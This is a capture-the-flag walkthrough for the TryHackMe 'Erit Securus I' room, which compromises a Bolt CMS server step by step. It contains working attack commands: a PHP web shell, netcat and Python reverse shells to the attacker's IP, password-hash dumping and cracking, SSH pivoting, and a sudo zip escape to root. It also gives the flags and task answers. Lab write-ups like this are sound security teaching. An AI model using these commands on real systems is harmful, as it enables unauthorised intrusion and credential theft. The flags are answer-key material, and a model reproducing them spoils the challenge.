# Erit Securus I

Learn to exploit the BoltCMS software by researching exploit-db.

# [Task 2] Reconnaissance

We run a simple nmap scan. You can learn more here (https://tryhackme.com/room/vulnversity)

## #2.1 - How many ports are open?

Nmap reveals 2 open ports:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 b1:ac:a9:92:d3:2a:69:91:68:b4:6a:ac:45:43:fb:ed (DSA)
|   2048 3a:3f:9f:59:29:c8:20:d7:3a:c5:04:aa:82:36:68:3f (RSA)
|   256 f9:2f:bb:e3:ab:95:ee:9e:78:7c:91:18:7d:95:84:ab (ECDSA)
|_  256 49:0e:6f:cb:ec:6c:a5:97:67:cc:3c:31:ad:94:a4:54 (ED25519)
80/tcp open  http    nginx 1.6.2
|_http-server-header: nginx/1.6.2
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## #2.2 - What ports are open? Comma separated, lowest first: **,**

Answer: `22,80`

# [Task 3] Webserver

Examine webserver. Identify what web-app is running.

## #3.1 - What CMS is the website built on?

At the bottom of the home page, there is a link disclosing that the site is build with Bolt:

~~~
$ curl -s http://10.10.13.44 | grep Built
    This website is <a href='%url%' target='_blank' title='Sophisticated, lightweight & simple CMS'>Built with Bolt</a>.
~~~

Answer: `Bolt`

# [Task 4] Exploit

Download [exploit](https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py) for this app. The exploit works, but might not fire every time. If you first don't succeed... 


## #4.1 - In the exploit from 2020-04-05, what language is used to write the exploit?

Let's download the exploit, which is written in python:

~~~
wget https://raw.githubusercontent.com/r3m0t3nu11/Boltcms-Auth-rce-py/master/exploit.py
~~~

Answer: `python`

## #4.2

**As the exploit is authenticated, you will also need a username and password. Knowing the URI for the login-portal is also critical for the exploit to work. Find the login-portal and try login in.**

*Hint: `admin:password`*

Visit the Bolt online [user manual](https://docs.bolt.cm/3.7/manual/login) to check the section about login. We are told that the login page can be found under the `/bolt` directory.

There is no indication about default credentials. Let's take the assumption that there is an `admin` account, and we will start with some basic passwords (`admin`, `password`, ...). It worked with `admin:password`.

# [Task 5] Reverse shell

`python3 exploit.py http://ip username password`

We can create a simple php-shell on the server, like this:

~~~
$ echo '<?php system($_GET["c"]);?>' > c.php
~~~

This we can use to upload a netcat reverse shell on the system and get a reverse shell, as there is no netcat on the box.

If you are using Kali Linux, the netcat installed supports the `-e` parameter (execute). Using this parameter we can start a shell upon connecting. 

The `-e` parameter is often removed from netcat in a lot of the Linux distributions, because it can be exploited to gain a shell. :-)

First we link the installed netcat to the current directory on our attacking machine:

~~~
ln -s $(which nc) .
~~~

Then we start a simple web server to serve some files, make sure the files you want to serve are in the current directory:

This will listen on port 8000 on you local machine: `python3 -m http.server 8000`

Using the `c.php` file we just dropped, we can browse to `http://serverip/files/cmd.php?c=wget http://yourip:8000/nc` to download a linux netcat to the server, you will see in your web server if it has been retrieved.

This file is dropped in the same directory as our `c.php`. We make this `nc` executable like this: `http://serverip/files/cmd.php?c=chmod 755 nc`

Now start a netcat listener on your own machine, listening on a free port (we use `4444` here)

~~~
ncat -nv -l -p 4444
~~~

When it is uploaded and made executable, we can run it like this: `http://serverip/files/cmd.php?c=./nc -e /bin/bash yourip 4444`.

If all goes well, you will see a connection coming in from the bolt server.
(Don’t forget to do the python pty dance, to make sure you have a shell with PTY’s allocated, some commands, especially sudo, require a PTY shell to run)

~~~
python -c 'import pty;pty.spawn("/bin/bash")'
~~~

## #5.1 - What is the username of the user running the web server?

Let's first run the exploit and confirm it's working:

~~~
$ python bolt.py http://10.10.13.44 admin password

 ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄       ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄      
▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░▌     ▐░░▌▐░░░░░░░░░░░▌     
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌      ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀▀▀      
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌▐░▌ ▐░▌▐░▌▐░▌               
▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄▄▄      
▐░░░░░░░░░░▌ ▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌     
▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌   ▀   ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌ 
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌       ▐░▌          ▐░ 
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌     ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀

Pre Auth rce with low credintanl
#Zero-way By @r3m0t3nu11 speical thanks to @dracula @Mr_Hex
[+] Retrieving CSRF token to submit the login form
[+] Login token is : qvZXTPCH360kuPkHdY1CJ3t0vda4hsw3oQ6uMDnSf3Y
[+] SESSION INJECTION 
[+] FOUND  : test27
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[+] FOUND  : test33
Enter OS command , for exit 'quit' : id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
";s:8:"*stack";a:0:{}s:10:"*enabled";i:1;s:17:"*shadowpassword";N;s:14:"*shadowtoken";N;s:17:"*shadowvalidity";N;s:15:"*failedlogins";i:0;s:17:"*throttleduntil";N;s:8:"*roles";a:2:{i:0;s:4:"root";i:1;s:8:"everyone";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:8:"*token";O:29:"Bolt\Storage\Entity\Authtoken":12:{s:5:"*id";s:2:"10";s:10:"*user_id";i:1;s:8:"*token";s:64:"e24a8ffc4daebd4b1b586ae4cbadb4be735d14ab3de9d49282260f592bec0459";s:7:"*salt";s:32:"1e7ed5c76f11a3bdc2ee3623f4c9bdc2";s:11:"*lastseen";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2020-04-25 16:01:38.867697";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:5:"*ip";s:13:"192.168.100.1";s:12:"*useragent";s:22:"python-requests/2.23.0";s:11:"*validity";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2020-05-09 16:01:38.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:10:"*checked";i:1587830498;}s:10:"_csrf/bolt";s:43:"-kIwVPHftVt0SZ3XJ_uBEDpT2x-COHYjo4ZSN5H7NUE";s:5:"stack";a:0:{}s:18:"_csrf/user_profile";s:43:"Spoy_vDCzRmnuZPfXYVJNmphWLl7Dv4kuc89Yev_2ag";}s:12:"_sf2_flashes";a:0:{}s:9:"_sf2_meta";a:3:{s:1:"u";i:1587830500;s:1:"c";i:1587830498;s:1:"l";s:1:"0";}}
~~~

Unfortunately, `nc` is not installed on the server. We can still do a reverse shell using python. Open a listener on your machine:

~~~
$ rlwrap nc -nlvp 4444
~~~

And execute the following command on the server (exploit shell):

~~~
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.54",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
~~~

We now have a shell.

~~~
$ whoami
whoami
www-data
~~~

Answer: `www-data`

# [Task 6] Priv esc

In the `app/database` directory you will find the `bolt.db` SQLite3 database

1. Open database
2. This contains a lot of tables
3. We list the bolt user database
4. We see two users, the admin we already own, the other one is a wild one. We also see another IP address, `192.168.100.1` (note to self)
5. We copy the hash and save it to a file. Then run it through john the ripper, using the infamous `rockyou` wordlist
6. Using this password, we try to su as the user wileec. This works, and we should find our first flag.

## #6.1 - What is the users password?

Let's dump the password hash from the SQLite database:

~~~
www-data@Erit:/var/www/html/app/database$ sqlite3 bolt.db
sqlite3 bolt.db
SQLite version 3.16.2 2017-01-06 16:32:41
Enter ".help" for usage hints.
sqlite> .tables
.tables
bolt_authtoken          bolt_field_value        bolt_pages            
bolt_blocks             bolt_homepage           bolt_relations        
bolt_content_changelog  bolt_log                bolt_showcases        
bolt_cron               bolt_log_change         bolt_taxonomy         
bolt_entries            bolt_log_system         bolt_users            
sqlite> select * from bolt_users;
select * from bolt_users;
1|admin|$2y$10$cBJ/8TRox2vvqllttvK0geVLVdJ0ysIdV403eCZuPJxKqVDeWRxhu||0|a@a.com|2020-06-22 18:27:09|192.168.100.1|[]|1|||||["root","everyone"]
2|wildone|$2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3p6bjOCGq.|Wile E Coyote|0|wild@one.com|2020-04-25 16:03:44|192.168.100.1|[]|1|||||["editor"]
sqlite> 
~~~

Now on our workstation, let's crack the password:

~~~
$ echo '$2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3p6bjOCGq.' > hash
$ /data/src/john/run/john hash --wordlist=/data/src/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
snickers         (?)
1g 0:00:00:02 DONE (2020-06-22 21:20) 0.3533g/s 178.0p/s 178.0c/s 178.0C/s 12345678910..claire
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~

wildone's password is `snickers`.

## #6.2 - Flag 1

Let's switch to user `wileec`:

~~~
www-data@Erit:/home/wileec$ su wileec
su wileec
Password: snickers

$ whoami
whoami
wileec
~~~

Upgrade your shell and get the flag:

~~~
$ SHELL=/bin/bash script -q /dev/null
SHELL=/bin/bash script -q /dev/null
wileec@Erit:~$ cat flag1.txt
cat flag1.txt
THM{Hey!_Welcome_in}
wileec@Erit:~$ 
~~~

# [Task 7] Pivoting

User `wileec` has a ssh private-key!

~~~
wileec@Erit:~$ ls -lart .ssh/
-rw-r--r-- 1 wileec wileec  393 Apr 25 15:19 id_rsa.pub
-rw------- 1 wileec wileec 1675 Apr 25 15:19 id_rsa
-rw-r--r-- 1 wileec wileec  222 Apr 25 15:32 known_hosts
~~~

Remember the other IP address? We could try to connect to that one, using the SSH key:

~~~
ssh wileec@192.168.100.1
~~~

Remember: This has to be done from inside of the box, as this network is not available to you from the outside.

We can sudo!

If you look at [gtfobins](https://gtfobins.github.io/) we can see how we could leverage this.

The command is not going to work as it is, you must edit some parts.

## #7.1 - User wileec can sudo! What can he sudo?

As we have discovered an IP address (`192.168.100.1`) in the SQLite database, let's try to connect to it using as we have found wileec has a SSH private key.

~~~
wileec@Erit:~$ ls -la ~/.ssh
ls -la ~/.ssh
total 20
drwxr-xr-x 2 wileec wileec 4096 Apr 25 15:32 .
drwxr-xr-x 4 wileec wileec 4096 Apr 25 17:15 ..
-rw------- 1 wileec wileec 1675 Apr 25 15:19 id_rsa
-rw-r--r-- 1 wileec wileec  393 Apr 25 15:19 id_rsa.pub
-rw-r--r-- 1 wileec wileec  222 Apr 25 15:32 known_hosts
~~~

Connect:

~~~
wileec@Erit:~$ ssh wileec@192.168.100.1
ssh wileec@192.168.100.1

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Apr 25 12:36:02 2020 from 192.168.100.100
~~~

From this new box, let's see our privileges:

~~~
$ sudo -l
sudo -l
Matching Defaults entries for wileec on Securus:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User wileec may run the following commands on Securus:
    (jsmith) NOPASSWD: /usr/bin/zip
$ 
~~~

We can run `zip` as user `jsmith` using sudo without password, which is great because there is a way to [get a shell](https://gtfobins.github.io/gtfobins/zip/) from it:

Answer: `(jsmith) NOPASSWD: /usr/bin/zip`

# [Task 8] Privesc #2

Using the sudo-trick, we’re now mr or mrs Smith (and admit, who does not want to be a Mr. or Mrs. Smith once in their life?), as an extra reward, there is flag 2 here.

## #8.1 - Flag 2

Let's do a lateral move to `jsmith`:

~~~
$ TF=$(mktemp -u)
$ sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
$ sudo rm $TF
$ SHELL=/bin/bash script -q /dev/null
jsmith@Securus:/home/wileec$ cd
cd
jsmith@Securus:~$ ls -la
ls -la
total 24
drwxrwx--- 2 jsmith jsmith 4096 Apr 25 12:39 .
drwxr-xr-x 4 root   root   4096 Apr 26 04:01 ..
-rw-r--r-- 1 jsmith jsmith  220 Nov  5  2016 .bash_logout
-rw-r--r-- 1 jsmith jsmith 3515 Nov  5  2016 .bashrc
-rw-r--r-- 1 jsmith jsmith   33 Apr 25 12:21 flag2.txt
-rw-r--r-- 1 jsmith jsmith  675 Nov  5  2016 .profile
jsmith@Securus:~$ cat flag2.txt
THM{Welcome_Home_Wile_E_Coyote!}
~~~

Flag 2: `THM{Welcome_Home_Wile_E_Coyote!}`

# [Task 9] Root

As `jsmith`, we again check for sudo rights (this btw, should be your first action on any box when gaining access to a account)

There are several ways to exploit this rights. Go for it!

## #9.1 - What sudo rights does jsmith have?

Let's check `jsmith`'s privileges:

~~~
jsmith@Securus:~$ sudo -l
sudo -l
Matching Defaults entries for jsmith on Securus:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jsmith may run the following commands on Securus:
    (ALL : ALL) NOPASSWD: ALL
~~~

`jsmith` can execute any action as sudo.

Answer: `(ALL : ALL) NOPASSWD: ALL`

## #9.2 - Flag 3

~~~
jsmith@Securus:~$ sudo -s
root@Securus:/home/jsmith# cd /root
root@Securus:~# ls -la
ls -la
total 28
drwx------  4 root root 4096 Apr 26 04:01 .
drwxr-xr-x 22 root root 4096 Apr 17 09:15 ..
lrwxrwxrwx  1 root root    9 Apr 22 07:04 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root   43 Apr 25 08:29 flag3.txt
drwx------  2 root root 4096 Apr 23 02:04 .gnupg
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
drwx------  2 root root 4096 Apr 17 09:46 .ssh
root@Securus:~# cat flag3.txt
THM{Great_work!_You_pwned_Erit_Securus_1!}
~~~

Flag 3: `THM{Great_work!_You_pwned_Erit_Securus_1!}`
